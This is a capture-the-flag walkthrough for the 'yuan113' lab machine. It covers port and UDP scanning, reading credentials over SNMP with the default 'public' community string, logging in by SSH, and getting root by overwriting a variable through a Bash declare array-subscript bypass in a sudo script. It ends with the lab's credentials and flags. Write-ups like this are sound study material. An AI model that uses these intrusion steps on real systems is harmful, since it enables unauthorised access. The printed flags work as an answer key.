+++
title = "Yuan113 - Walkthrough"
date = "2026-07-09"
author = "nvru"
description = "Walkthrough for the yuan113 machine."
tags = [
"ctf",
"walkthrough",
"linux",
"snmp",
"bash",
"ssh",
"snmp-enumeration",
"privilege-escalation"
]
draft = false
+++

## Overview

- **Attacker IP:** `10.10.10.2`
- **Target IP:** `10.10.10.17`

The objective was to enumerate the target, identify exposed services, obtain initial access by enumerating SNMP credentials, and escalate privileges by exploiting an insecure use of Bash's `declare` builtin in a sudo-allowed script.

![Machine Information](/images/hmv/yuan113/vm.png)

---

# Port Scanning

## RustScan

```bash
rustscan -a 10.10.10.17 -- -sC -sV -A -oA nmap/rust
```

### Results

```text
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u3
80/tcp open  http    Apache httpd 2.4.62 (Debian)
```

Only SSH and HTTP were exposed, so I began enumerating the web application.

---

# Enumeration

## HTTP Enumeration

Browsing to the web server revealed nothing more than a simple welcome page containing a quote.

![Homepage](/images/hmv/yuan113/http.png)

Viewing the page source also did not reveal any hidden endpoints or interesting comments.

---

## Directory Enumeration

Since the website didn't expose any useful functionality, I performed directory brute forcing.

```bash
gobuster dir \
-u http://10.10.10.17 \
-w /opt/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt \
-x html,php,js,txt,xml,sql,bak,wav,jpg,jpeg,png
```

The scan completed without discovering any interesting files or directories.

![Directory Enumeration](/images/hmv/yuan113/dir_brute_nothing.png)

With HTTP proving to be a dead end, I moved on to enumerate UDP services.

---

## UDP Enumeration

```bash
nmap -sU --top-ports 100 10.10.10.17 -oA nmap/top_100_udp
```

The scan revealed an SNMP service listening on port 161.

```text
PORT    STATE         SERVICE
68/udp  open|filtered dhcpc
161/udp open          snmp
```

Using the default community string `public`, I enumerated the service.

```bash
snmpbulkwalk -c public -v2c 10.10.10.17 | bat -l java
```

Among the returned data were valid credentials.

```text
welcome:mMOq2WWONQiiY8TinSRF
```

![SNMP Credentials](/images/hmv/yuan113/snmp_creds.png)

Since SSH was the only authentication service exposed on the machine, these credentials were worth trying.

---

# Initial Access

Using the recovered credentials:

```text
Username: welcome
Password: mMOq2WWONQiiY8TinSRF
```

I successfully authenticated via SSH.

![SSH Login](/images/hmv/yuan113/ssh_as_welcome.png)

---

# Privilege Escalation

## welcome → root

The first thing I checked was the user's sudo permissions.

```bash
sudo -l
```

The output showed that `welcome` could execute `/opt/113.sh` as any user, including root, without providing a password.

![sudo permissions](/images/hmv/yuan113/sudo_l.png)

My first thought was to modify the script directly, but the file wasn't writable.

![No Write Permission](/images/hmv/yuan113/no_perm.png)

Since modifying it wasn't possible, I inspected its source code.

```bash
cat /opt/113.sh
```

```bash
#!/bin/bash

sandbox=$(mktemp -d)
cd $sandbox

if [ "$#" -ne 3 ];then
        exit
fi

if [ "$3" != "mazesec" ]
then
        echo "\$3 must be mazesec"
        exit
else
        /bin/cp /usr/bin/mazesec $sandbox
        exec_="$sandbox/mazesec"
fi

if [ "$1" = "exec_" ];then
        exit
fi

declare -- "$1"="$2"
$exec_
```

<!-- ![Script Source](/images/hmv/yuan113/mazesec.png) -->

The script creates a temporary directory using `mktemp`, changes into it, verifies that exactly three arguments are supplied, and checks that the third argument equals `mazesec`. If those checks pass, it copies `/usr/bin/mazesec` into the temporary directory and stores its path in the variable `exec_`.

Before executing the binary, the script contains a single protection:

```bash
if [ "$1" = "exec_" ];then
    exit
fi
```

Finally, it executes:

```bash
declare -- "$1"="$2"
$exec_
```

Under normal conditions, the script behaves as expected.

![Normal Execution](/images/hmv/yuan113/normal_test.png)

The developer attempted to prevent users from overwriting the `exec_` variable by rejecting the literal string `exec_`. However, Bash array syntax bypasses this check.

My first attempt used `exec_[`, which resulted in an error because the array syntax was incomplete.

![Failed Attempt](/images/hmv/yuan113/not_close.png)

Adding an index such as `-1` or `0` produces valid Bash syntax while still modifying the original variable.

![Successful Bypass](/images/hmv/yuan113/close_exec.png)

To verify code execution, I first replaced the command with `id`.

```bash
sudo -u root /opt/113.sh 'exec_[-1]' id mazesec
```

The output confirmed that the command was executed with root privileges.

![Root id](/images/hmv/yuan113/id_work_asroot.png)

Replacing `id` with an interactive shell resulted in a root shell.

```bash
sudo -u root /opt/113.sh 'exec_[-1]' 'bash -i' mazesec
```

![Root Shell](/images/hmv/yuan113/root.png)

After gaining root access, I recovered the root password from `/root`.

![Root Password](/images/hmv/yuan113/root_passwd.png)

---

# Credentials

```text
welcome:mMOq2WWONQiiY8TinSRF

root:9R3dosCkcEA3OQIzCoYO
```

---

# Flags

```text
user:flag{user-21539141ad1bc8ab9d26420aecb2415b}

root:flag{root-9f283fe2f6363f99f80ed7f3f3c3cb19}
```
